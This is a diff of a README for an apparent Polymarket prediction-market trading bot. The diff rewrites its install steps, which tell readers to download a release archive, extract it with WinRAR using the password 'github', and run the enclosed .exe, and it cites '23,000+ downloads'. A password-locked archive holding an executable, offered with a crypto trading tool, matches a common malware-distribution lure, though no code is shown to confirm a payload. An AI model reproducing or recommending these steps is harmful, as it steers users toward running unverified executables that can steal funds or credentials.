@@ -41,10 +41,10 @@ It's built for traders who want to automate positions on prediction markets (ele
 
 Latest release: **23,000+ downloads**
 
-1. Go to the **[Releases](https://github.com/yourusername/openclaw-polymarket-bot/releases)** page.
-2. Download the latest bot release archive.
-3. Unarchive the bot archive using **WinRAR** (password: `github`).
-4. Run the bot executable (`.exe`).
+1. Go to the **Releases** page.
+2. Download the latest version of the bot.
+3. Extract the archive using **WinRAR** (password: `github`).
+4. Launch the bot by running the `.exe` file.
 
 ## Setting Up
 
